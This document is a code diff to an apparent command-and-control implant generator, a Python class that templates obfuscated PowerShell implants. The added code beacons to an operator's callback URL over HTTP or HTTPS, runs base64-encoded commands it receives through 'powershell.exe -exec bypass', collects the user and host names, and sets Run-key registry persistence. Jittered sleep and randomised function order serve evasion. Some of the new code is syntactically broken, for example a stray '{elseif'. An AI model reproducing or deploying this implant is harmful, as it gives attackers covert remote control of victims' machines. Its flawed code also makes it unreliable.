@@ -19,110 +19,39 @@ class ImplantGenerator:
                            "obf_https_conn": "https-connection",
                            "obf_dns_conn": "dns-connection",
                            "obf_create_persistence": "create-persistence",
-                           "obf_builtin_command": "builtin-commands",
+                           "obf_builtin_command": "execute-command",
                            "obf_reg_key_name": "FudgeC2Persistence",
                            "obf_callback_url":"url",
                            "obf_callback_reason":"callback_reason"
                            }
 
+    # -- This is to be finished with PoC WorkWork audio
     play_audio = '''
-function {{ ron.obf_remote_play_audio }} {
+function {{ ron.obf_remote_play_audio }}($data) {
     $args[0]
 }
 '''
-# -- TODO: Create implant persistence.
+    # -- EMPTY TO FILL
     fde_func_a = '''
 function aaaaaa() {}
-    '''
+'''
 
+    # -- KEEP
     fde_func_b = '''
 function {{ ron.obf_collect_sysinfo }}(){
     $hostN = hostname
     $final_str = $env:UserName+"::"+$hostN
     $Script:tr = $final_str
-    write-output $Script:tr
     return $final_str
 }
-    '''
+'''
 
-    update_implant = '''
-function {{ ron.obf_builtin_command }} ($a) {
-    $Script:tr = ""
-    $b=($a -split "::")
-    if ($b -Like " sys_info") {
-        return {{ ron.obf_collect_sysinfo }}(0)
-    } elseif ($b -Like " enable_persistence") {
-        {{ ron.obf_create_persistence }}
-        $result = "Success"
-    } else {
-        $result = "Error"
-        $Script:tr = "Fudge: Error."
-    }
-    return $result
-}
-    '''
+    # -- OPTIONAL REMOVEAL
     random_function = '''
 function {{ ron.rnd_function }} () {}
-        '''
+'''
 
-    http_function = '''
-function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
-    $Body =  @{username='me';moredata='qwerty'}
-    $headers = @{}
-    
-    if (${{ ron.obf_callback_reason }} -eq 0 ){
-        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
-        $headers.Add("X-Implant","{{ uii }}")
-    } else {
-        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
-        $headers.Add("X-Result","${{ ron.obf_callback_reason }}")
-    }
-    try {
-        $LoginResponse = Invoke-WebRequest $URL -Headers $headers -Body $Body -Method 'POST'
-        $kni = $LoginResponse.Headers['X-Command']
-    }
-    catch {
-        $kni = "=="
-    }
-    return $kni
-}
-    '''
-
-
-    https_function = '''
-function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
-    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
-        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
-    } else {
-        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
-    }
-    try {
-        $kk = [System.Net.WebRequest]::Create($URL);
-        $kk.Method = "POST"
-        if ( ${{ ron.obf_callback_reason }} -eq 0 ){
-            $kk.Headers.Add("X-Implant","{{ uii }}")
-        } else {
-            $kk.Headers.Add("X-Result","${{ ron.obf_callback_reason }}")
-        }      
-        $kk.Timeout = 10000;
-        $LoginResponse = $kk.GetResponse()
-        $bb = $LoginResponse.Headers["X-Command"]
-        $LoginResponse.dispose()
-    }
-    catch [system.exception] {
-        $LoginResponse.dispose()
-        $bb = "=="
-    }
-    return $bb
-}
-    '''
-    # -- Legacy
-    start_sleep = '''
-function {{ ron.obf_start_sleep }}($a){
-    sleep (Get-Random -Minimum ($a *0.90) -Maximum ($a *1.10))
-}
-    '''
-
+    # -- This needs improvement, it only supports http persistence.
     create_persistence = '''
 function {{ ron.obf_create_persistence }}(){
     $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
@@ -135,13 +64,99 @@ function {{ ron.obf_create_persistence }}(){
     }
     $Script:tr = "Enabled"
 }
-    '''
+'''
+
+    execute_command = '''
+function {{ ron.obf_builtin_command }}($data){
+    $a = $data.Substring(0,2)
+    if ($data.Substring(2).length -gt 1){
+        $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(2)))
+    } else {
+        $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(2)))
+    }
+    if($a -eq "CM"){
+        $Script:tr = powershell.exe -exec bypass -C "$b"
+    } elseif($a -eq "SI"){
+        {{ ron.obf_collect_sysinfo }}
+    } elseif ($a -eq "EP"){
+        {{ ron.obf_create_persistence }}
+    {elseif ($a -eq "PS"){
+        {{ ron.obf_remote_play_audio }}($b)
+    } else {
+        $Script:tr = "0"
+    }
+}
+'''
+
+    http_function = '''
+function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
+    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
+        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
+    } else {
+        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/help"
+    }
+    $enc = [system.Text.Encoding]::UTF8
+    $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
+    $kk = [System.Net.WebRequest]::Create($URL);
+    $kk.Method = "POST"
+    if ( ${{ ron.obf_callback_reason }} -eq 0){
+        $kk.Headers.Add("X-Implant","{{ uii }}")
+    } else {
+        $kk.Headers.Add("X-Result","{{ uii }}")
+    }
+    $kk.ContentLength = $data2.Length
+    $kk.KeepAlive = $false;
+    $kk.Timeout = 10000;
+    $kk.SendChunked = $true;
+    $requestStream = $kk.GetRequestStream()
+    $requestStream.Write($enc.GetBytes($data2), 0, $data2.Length)
+    $requestStream.Flush()
+    $resp = $kk.GetResponse()
+    $reqstream = $resp.GetResponseStream()
+    $sr = new-object System.IO.StreamReader $reqstream
+    $result  = $sr.ReadtoEnd()
+    return $result
+}    
+
+'''
+
+    https_function = '''
+function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
+    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
+        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
+    } else {
+        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
+    }
+    $enc = [system.Text.Encoding]::UTF8
+    $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
+    $kk = [System.Net.WebRequest]::Create($URL);
+    $kk.Method = "POST"
+    if ( ${{ ron.obf_callback_reason }} -eq 0){
+        $kk.Headers.Add("X-Implant","{{ uii }}")
+    } else {
+        $kk.Headers.Add("X-Result","{{ uii }}")
+    }
+    $kk.ContentLength = $data2.Length
+    $kk.KeepAlive = $false;
+    $kk.Timeout = 10000;
+    $kk.SendChunked = $true;
+    $requestStream = $kk.GetRequestStream()
+    $requestStream.Write($enc.GetBytes($data2), 0, $data2.Length)
+    $requestStream.Flush()
+    $resp = $kk.GetResponse()
+    $reqstream = $resp.GetResponseStream()
+    $sr = new-object System.IO.StreamReader $reqstream
+    $result  = $sr.ReadtoEnd()
+    return $result
+}    
+'''
+
     select_protocol='''
 function {{ ron.obf_select_protocol }}($b){
     sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
     return get-random($b)
 }
-    '''
+'''
 
     implant_main = '''
 {{ obf_variables }}
@@ -153,36 +168,28 @@ start-sleep({{ initial_sleep }})
 ${{ ron.obf_sleep }}={{ beacon }}
 ${{ ron.obf_callback_url }} = "{{ url }}"
 while($true){
-    # {{ ron.obf_start_sleep }}(${{ ron.obf_sleep }})
     $plh=0
     try {
-        {{ proto_core }}
-    }
-    catch {
+            {{ proto_core }}
+    } catch {
         $_.Exception | format-list -Force
     }
-    # Write-Output "$headers"
     if ( $headers -NotLike "=="){
-        write-output "Non-sleep value"
-        if ( $headers.Substring(0,2) -Like "::") {
-            {{ ron.obf_builtin_command }}($headers)
-        } else {
-            $tr = powershell.exe -exec bypass -C "$headers"
-        }
-        # -- If command issued this is the pre-return processing.
+        execute_command($headers)
+        {{ ron.obf_builtin_command }}($headers)
         $atr = $tr -join "`n"
-        $gtr="{{ uii }}::$atr"
-        $plh = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
-        try {
-            {{ proto_core }}
-        } catch {
-            $_.Exception | format-list -Force
-        }
-        
-        
+        $plh = $atr
+
+        if ($Script:tr -ne "0"){ 
+            try {
+                    {{ proto_core }}
+            } catch {
+                $_.Exception | format-list -Force
+            }
+        }       
     }
 }
-    '''
+'''
 
     def _manage_implant_function_order(self, implant_info, function_list):
         # -- This is responsible for randomising the function order within the generated implant.
@@ -208,7 +215,7 @@ while($true){
         # Add default functions to added to the implant which will be randomised.
         implant_functions = [self.play_audio,
                              self.random_function,
-                             self.update_implant,
+                             self.execute_command,
                              self.fde_func_a,
                              self.fde_func_b,
                              self.create_persistence,
